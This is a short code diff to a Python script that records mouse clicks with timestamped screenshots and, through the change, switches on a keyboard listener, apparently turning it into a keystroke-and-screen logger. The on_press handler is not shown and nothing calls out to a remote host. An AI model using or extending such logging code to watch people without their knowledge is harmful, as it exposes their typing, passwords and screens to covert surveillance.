@@ -37,10 +37,10 @@ def on_click(x, y, button, pressed):
         file_var = folder_new + horaprint +'.jpg'
         screenshot.save(os.path.join(file_var))
 
-#keyboardListener = KeyboardListener(on_press=on_press)
+keyboardListener = KeyboardListener(on_press=on_press)
 mouseListener = MouseListener(on_click=on_click)
 
-#keyboardListener.start()
+keyboardListener.start()
 mouseListener.start()
-#keyboardListener.join()
+keyboardListener.join()
 mouseListener.join()
